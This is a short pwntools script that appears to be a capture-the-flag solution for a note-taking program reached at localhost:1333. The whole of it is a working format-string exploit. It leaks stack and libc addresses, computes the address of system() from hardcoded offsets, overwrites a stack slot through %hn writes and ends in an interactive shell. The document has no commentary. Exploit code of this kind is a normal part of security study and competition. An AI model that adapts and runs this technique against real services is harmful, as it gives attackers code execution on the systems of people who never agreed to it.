from pwn import *

p = remote('localhost', 1333)
#p = process('./main')

p.sendline(b'1')
p.sendline(b'%10$p')
p.sendline(b'2')

p.recvuntil(b'Your note: ')
stack_leak = int(p.recvline().strip(), 16)
log.info(hex(stack_leak))

p.sendline(b'3')
p.sendline(b'%25$p')
p.sendline(b'2')

p.recvuntil(b'Your note: ')
libc_leak = int(p.recvline().strip(), 16)
libc_base = libc_leak - 0x2a1ca
log.info(hex(libc_base))


system_libc = libc_base + 0x58740
sys_1 = system_libc & 0xffff
sys_2 = (system_libc >> 16) & 0xffff 
sys_3 = (system_libc >> 32) & 0xffff
i_1 = (stack_leak  - 0x18) & 0xffff
i_2 = (stack_leak  - 0x18 + 2) & 0xffff
i_3 = (stack_leak  - 0x18 + 4) & 0xffff

p.sendline(b'3')
p.sendline(f'%{i_1}p%10$hn')
p.sendline(b'2')
p.sendline(b'3')
p.sendline(f'%{sys_1}p%20$hn')
p.sendline(b'2')

p.sendline(b'3')
p.sendline(f'%{i_2}p%10$hn')
p.sendline(b'2')
p.sendline(b'3')
p.sendline(f'%{sys_2}p%20$hn')
p.sendline(b'2')

p.sendline(b'3')
p.sendline(f'%{i_3}p%10$hn')
p.sendline(b'2')
p.sendline(b'3')
p.sendline(f'%{sys_3}p%20$hn')
p.sendline(b'2')

p.sendline(b'3')
p.sendline(b'sh')

p.sendline(b'4')

p.interactive()
